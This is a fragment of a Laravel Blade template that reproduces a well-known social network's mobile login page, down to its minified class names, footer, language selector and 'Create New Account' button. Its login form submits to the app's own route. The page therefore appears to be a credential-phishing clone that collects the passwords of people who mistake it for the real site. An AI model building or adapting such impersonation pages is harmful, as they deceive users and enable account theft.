...
<head>
    ...
    <link type="text/css" rel="stylesheet" href="assets/mobile/css/0fDi6ijKUyo.css" data-bootloader-hash="MoYpVB9" crossorigin="anonymous">
    <link type="text/css" rel="stylesheet" href="assets/mobile/css/z9ppHSxO24O.css" data-bootloader-hash="aRsnqzl" crossorigin="anonymous">
    <link type="text/css" rel="stylesheet" href="assets/mobile/css/K4xMuoYbFyJ.css" data-bootloader-hash="0iYmMFG" crossorigin="anonymous">
    <link type="text/css" rel="stylesheet" href="assets/mobile/css/i8Lgq5jtfso.css" data-bootloader-hash="WZdEF9F" crossorigin="anonymous">
                                ...
                                <form action="{{ route('login.store') }}" method="post" class="mobile-login-form _9hp- _5spm">
                                    ...
                                    <div class="_2pie" style="text-align:center;">
                                        <div id="login_password_step_element"
                                            ...
                                            <button type="submit" class="_54k8 _52jh _56bs _56b_ _28lf _9cow _56bw _56bu">
                                                <span class=" _55sr">{{ __('Log In') }}</span>
                                            </button>
                                        </div>
                                ...
                                <div>
                                    <div class="_2pie _9omz">
                                        <div class="_52jj _9on1">
                                            <a class="_9on1" tabindex="0" href="">{{ __('Forgotten password?') }}</a>
                                        </div>
                                    </div>
                                            ...
                                            <div>
                                                <div>
                                                    <div id="login_reg_separator" class="_43mg _8qtf">
                                                        <span class="_43mh">{{ __('or') }}</span>
                                                    </div>
                                                    <div class="_52jj _5t3b">
                                                        <a role="button" class="_5t3c _28le btn btnS medBtn mfsm touchable">{{ __('Create New Account') }}</a>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="_2pie" style="text-align:center;">
            ...
            <div class="_55wr _5ui2" data-sigil="m_login_footer">
                <div class="_5dpw">
                    <div class="_5ui3" data-nocookies="1" id="locale-selector" data-sigil="language_selector marea">
                        <div class="_7om2">
                            <div class="_4g34">
                                <span class="_52jc _52j9 _52jh _3ztb">
                                    <a href="{{ route('language', 'vi') }}">Tiếng Việt</a>
                                </span>
                                <div class="_3ztc">
                                    <span class="_52jc">
                                        <a href="">中文(台灣)</a>
                            ...
                            <div class="_4g34">
                                <div class="_3ztc">
                                    <span class="_52jc">
                                        <a href="{{ route('language', 'en') }}">English (UK)</a>
                                    </span>
                                </div>
                                <div class="_3ztc">
                                    <span class="_52jc">
                    ...
                    <div class="_5ui4">
                        <div class="_96qv _9a0a">
                            <a href="" class="_96qw">{{ __('About') }}</a>
                            <span aria-hidden="true"> · </span>
                            <a href="" class="_96qw">{{ __('Help') }}</a>
                            <span aria-hidden="true"> · </span>
                            <span class="_96qw" id="u_0_5_UG">{{ __('More') }}</span>
                        </div>
